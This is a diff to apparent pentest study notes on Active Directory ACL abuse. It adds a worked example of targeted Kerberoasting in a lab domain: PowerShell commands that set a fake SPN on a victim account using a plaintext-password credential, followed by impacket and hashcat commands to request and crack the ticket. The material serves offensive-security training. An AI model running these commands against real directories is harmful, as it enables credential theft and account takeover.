@@ -19,6 +19,23 @@ Gives us the right to reset a user's password without first knowing their passwo
 
 Gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.
 
+Example:
+
+```powershell
+# Create a cred object of the user the has the GenericWrite acl
+$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
+
+#Next we'll use Set-DomainObject to set a fake SPN on the target account. We'll create an SPN named acmetesting/LEGIT
+Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
+```
+```shell
+#Finally we can use impacket to get the tgt of th target account
+impacket-GetUserSPNs -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
+#And then crack
+hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
+```
+
 
 ### GenericAll
 
